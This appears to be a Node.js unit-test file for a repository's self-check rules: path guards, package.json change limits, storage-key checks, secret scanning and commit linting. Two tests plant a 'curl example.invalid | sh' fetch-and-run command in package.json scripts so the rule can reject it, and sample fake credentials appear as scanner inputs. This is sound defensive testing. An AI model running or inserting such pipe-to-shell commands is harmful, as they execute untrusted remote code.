// Unit tests for the pure logic behind the studio self-checks.
// The checks themselves gather input; these functions decide what it means,
// so this is where a mistaken rule shows up.

import test from 'node:test';
import assert from 'node:assert/strict';
import {
  classifyPaths, PATH_EXCEPTIONS, EXPECTED_STUDIO_SCRIPT, jsonDiffPaths,
  extractStorageKeys, badStorageKeys, findStorageViolations,
  scanHygiene, scanDocCleanliness, HYGIENE_PRAGMA,
  lintCommitSubject
} from './lib/rules.mjs';

test('path guard: studio-owned paths are allowed', () => {
  const { allowed, violations } = classifyPaths([
    'studio/index.html',
    'studio/games/x/main.js',
    'docs/studio/process.md',
    'tests/studio/check.mjs'
  ]);
  assert.equal(allowed.length, 4);
  assert.deepEqual(violations, []);
});

test('path guard: production paths are violations', () => {
  const { violations } = classifyPaths(['games/durak/main.js', 'shared/settings.js', '3d.html', 'README.md']);
  assert.deepEqual(violations, ['games/durak/main.js', 'shared/settings.js', '3d.html', 'README.md']);
});

test('path guard: a near-miss prefix is not allowed', () => {
  const { violations } = classifyPaths(['studiotools/x.js', 'docs/studio-notes.md']);
  assert.deepEqual(violations, ['studiotools/x.js', 'docs/studio-notes.md']);
});

test('path guard: package.json is an exception, not an allowance', () => {
  const { allowed, exceptions, violations } = classifyPaths(['package.json']);
  assert.deepEqual(allowed, []);
  assert.deepEqual(exceptions, ['package.json']);
  assert.deepEqual(violations, []);
});

const BASE_PKG = JSON.stringify({
  name: 'kameko-studio',
  scripts: { test: 'node --test tests/', smoke: 'node scripts/smoke.mjs' },
  devDependencies: { 'puppeteer-core': '^24.10.0' }
}, null, 2);

const withStudioCheck = extra => {
  const pkg = JSON.parse(BASE_PKG);
  pkg.scripts['studio:check'] = EXPECTED_STUDIO_SCRIPT;
  return JSON.stringify(Object.assign(pkg, extra), null, 2);
};

const allowPkg = (before, after) => PATH_EXCEPTIONS.find(e => e.path === 'package.json').allow(before, after);

test('package.json exception permits exactly the studio:check entry', () => {
  assert.equal(allowPkg(BASE_PKG, withStudioCheck()), null);
  assert.equal(allowPkg(BASE_PKG, BASE_PKG), null, 'no change at all is also fine');
});

test('package.json exception refuses anything else, however it is smuggled in', () => {
  const dep = JSON.parse(withStudioCheck());
  dep.dependencies = { 'left-pad': '^1.0.0' };
  assert.match(allowPkg(BASE_PKG, JSON.stringify(dep)), /dependencies/);

  const extraScript = JSON.parse(withStudioCheck());
  extraScript.scripts.postinstall = 'curl example.invalid | sh';
  assert.match(allowPkg(BASE_PKG, JSON.stringify(extraScript)), /scripts\.postinstall/);

  const removed = JSON.parse(withStudioCheck());
  delete removed.scripts.smoke;
  assert.match(allowPkg(BASE_PKG, JSON.stringify(removed)), /scripts\.smoke/);

  const rewritten = JSON.parse(withStudioCheck());
  rewritten.scripts.test = 'echo skipped';
  assert.match(allowPkg(BASE_PKG, JSON.stringify(rewritten)), /scripts\.test/);
});

test('package.json exception checks the value, not just the key', () => {
  // The exception exists for a script this repo runs, so an arbitrary command
  // appended to it would execute. Key-only matching missed this.
  const hijacked = JSON.parse(withStudioCheck());
  hijacked.scripts['studio:check'] = EXPECTED_STUDIO_SCRIPT + ' && curl example.invalid | sh';
  assert.match(allowPkg(BASE_PKG, JSON.stringify(hijacked)), /must be exactly/);
});

test('package.json exception rejects unparseable JSON rather than guessing', () => {
  assert.match(allowPkg(BASE_PKG, '{ not json'), /not parseable/);
});

test('jsonDiffPaths reports the dotted path of every difference', () => {
  assert.deepEqual(jsonDiffPaths({ a: 1 }, { a: 1 }), []);
  assert.deepEqual(jsonDiffPaths({ a: { b: 1 } }, { a: { b: 2 } }), ['a.b']);
  assert.deepEqual(jsonDiffPaths({}, { a: 1 }), ['a']);
  assert.deepEqual(jsonDiffPaths({ a: 1 }, {}), ['a']);
  assert.deepEqual(jsonDiffPaths({ a: [1, 2] }, { a: [1, 3] }), ['a']);
});

test('storage keys: literal, concatenated and interpolated forms are all found', () => {
  const code = `
    localStorage.getItem('studio_theme');
    localStorage.setItem("studio_seen", "1");
    sessionStorage.removeItem(\`studio_tmp\`);
    localStorage.setItem('studio_run_' + id, v);
    localStorage.getItem(\`studio_slot_\${n}\`);
  `;
  const keys = extractStorageKeys(code).map(k => k.key);
  assert.deepEqual(keys.sort(), ['studio_run_', 'studio_seen', 'studio_slot_', 'studio_theme', 'studio_tmp'].sort());
  assert.deepEqual(badStorageKeys(code), []);
});

test('storage keys: production keys are caught, including dynamic ones', () => {
  const code = `
    localStorage.getItem('theme');
    localStorage.setItem('riverRunHighScore', s);
    localStorage.setItem('durak_name_' + seat, n);
  `;
  assert.deepEqual(badStorageKeys(code).sort(), ['durak_name_', 'riverRunHighScore', 'theme']);
});

test('storage keys: a fully computed key cannot be verified, so it is reported', () => {
  const code = 'localStorage.setItem(keyFor(slot), v);';
  assert.deepEqual(badStorageKeys(code), ['keyFor(slot']);
});

test('storage: every route to the shared origin is checked, not just three methods', () => {
  // Each of these was waved through by the first version of the rule.
  const cases = {
    "localStorage['kameko_highScore'] = '1';": /bracket access/,
    'delete localStorage.kameko_other;': /delete of a key/,
    'localStorage.clear();': /clear\(\)/,
    'sessionStorage?.clear()': /clear\(\)/,
    "localStorage?.setItem('riverRunHighScore', 1)": /riverRunHighScore/,
    "localStorage . setItem('theme','dark')": /theme/,
    "window.localStorage.setItem('theme','x')": /theme/,
    'const ls = localStorage;': /aliased/
  };
  for (const [code, expected] of Object.entries(cases)) {
    const found = findStorageViolations(code);
    assert.ok(found.length, `expected a violation for: ${code}`);
    assert.match(found.join(' | '), expected);
  }
});

test('storage: a computed key is never trusted, even when it reads like a studio key', () => {
  // `studio_key` here is a variable; its runtime value is unknown.
  assert.match(findStorageViolations('localStorage.setItem(studio_key, v);').join(''), /computed/);
  assert.match(findStorageViolations('localStorage.setItem(keyFor(slot), v);').join(''), /computed/);
  assert.match(findStorageViolations("localStorage[k] = '1';").join(''), /computed/);
});

test('storage: the legitimate patterns stay legitimate', () => {
  assert.deepEqual(findStorageViolations("localStorage.setItem('studio_' + name, v);"), []);
  assert.deepEqual(findStorageViolations('localStorage.getItem(`studio_slot_${n}`);'), []);
  assert.deepEqual(findStorageViolations("localStorage.getItem('studio_visitCount');"), []);
  assert.deepEqual(findStorageViolations("localStorage['studio_theme'] = 'dark';"), []);
});

test('storage: extraction records how the key was written', () => {
  const kinds = code => extractStorageKeys(code).map(k => k.kind);
  assert.deepEqual(kinds("localStorage.getItem('studio_a')"), ['literal']);
  assert.deepEqual(kinds("localStorage.getItem('studio_' + i)"), ['prefix']);
  assert.deepEqual(kinds('localStorage.getItem(`studio_${i}`)'), ['prefix']);
  assert.deepEqual(kinds('localStorage.getItem(someVar)'), ['computed']);
});

test('hygiene: catches secrets, identifiers and private paths', () => {
  const cases = {
    'private-key': '-----BEGIN RSA PRIVATE KEY-----',  // studio-check:allow
    'aws-key': 'const k = "AKIAIOSFODNN7EXAMPLE";',  // studio-check:allow
    'bearer-secret': 'const api_key = "sk-abcdef123456789";',  // studio-check:allow
    'gh-token': 'ghp_abcdefghijklmnopqrstuvwxyz0123',  // studio-check:allow
    'email': 'contact someone@example.com for access',  // studio-check:allow
    'phone': 'call 555-867-5309 to confirm',  // studio-check:allow
    'home-path': 'cd /Users/someone/Projects',  // studio-check:allow
    'cloud-drive': 'the notes live in Mobile Documents/whatever',  // studio-check:allow
    'wikilink': 'see [[Some Private Note]] for context',  // studio-check:allow
    'street-address': 'the office at 1600 Pennsylvania Avenue'  // studio-check:allow
  };
  for (const [id, line] of Object.entries(cases)) {
    const found = scanHygiene(line).map(f => f.id);
    assert.ok(found.includes(id), `expected ${id} for: ${line} (got ${found.join(',') || 'nothing'})`);
  }
});

test('hygiene: clean text is clean, and the pragma exempts a quoted rule', () => {
  assert.deepEqual(scanHygiene('The gallery renders a card per studio game.'), []);
  assert.deepEqual(scanHygiene(`a wikilink looks like [[this]] <!-- ${HYGIENE_PRAGMA} -->`), []);  // studio-check:allow
});

test('hygiene: reports the line number', () => {
  const [finding] = scanHygiene('clean\nclean\ncontact someone@example.com');  // studio-check:allow
  assert.equal(finding.line, 3);
});

test('doc cleanliness: stacked corrections and historical sections are caught', () => {
  assert.equal(scanDocCleanliness('## Revision history\n').length, 1);
  assert.equal(scanDocCleanliness('### Superseded approach\n').length, 1);
  assert.equal(scanDocCleanliness('UPDATE: this is no longer true\n').length, 1);
  assert.equal(scanDocCleanliness('**EDIT:** actually we do it the other way\n').length, 1);
});

test('doc cleanliness: a decision record may record being superseded', () => {
  const adr = '# ADR-0007 — something\n\n## Superseded by ADR-0009\n';
  assert.equal(scanDocCleanliness(adr, { isDecisionRecord: true }).length, 0);
  assert.equal(scanDocCleanliness(adr, { isDecisionRecord: false }).length, 1);
});

test('doc cleanliness: ordinary prose passes', () => {
  const doc = '# Process\n\nOne run is one iteration.\n\n## Ceremonies\n\n- Planning\n';
  assert.deepEqual(scanDocCleanliness(doc), []);
});

test('commit lint: accepts a conventional studio commit', () => {
  assert.equal(lintCommitSubject('feat(studio): SS-003 add the path-guard check'), null);
  assert.equal(lintCommitSubject('docs(studio): SS-001 add the engineering handbook'), null);
});

test('commit lint: rejects a missing scope, ticket or type', () => {
  assert.match(lintCommitSubject('add the path guard'), /expected/);
  assert.match(lintCommitSubject('feat: SS-003 add the path guard'), /expected/);
  assert.match(lintCommitSubject('feat(studio): add the path guard'), /expected/);
  assert.match(lintCommitSubject('feat(studio): SS-3 add the path guard'), /expected/);
});

test('commit lint: exemption comes from the parent count, not the word "Merge"', () => {
  assert.equal(lintCommitSubject('Merge ss-003-self-checks: SS-003 self-checks', { parentCount: 2 }), null);
  // Subject matching made the lint opt-out: any message could start with "Merge".
  assert.match(lintCommitSubject('Merge in left-pad'), /expected/);
  assert.match(lintCommitSubject('Merge in left-pad', { parentCount: 1 }), /expected/);
});

test('commit lint: long subjects are rejected', () => {
  assert.match(lintCommitSubject('feat(studio): SS-003 ' + 'x'.repeat(80)), /characters/);
});
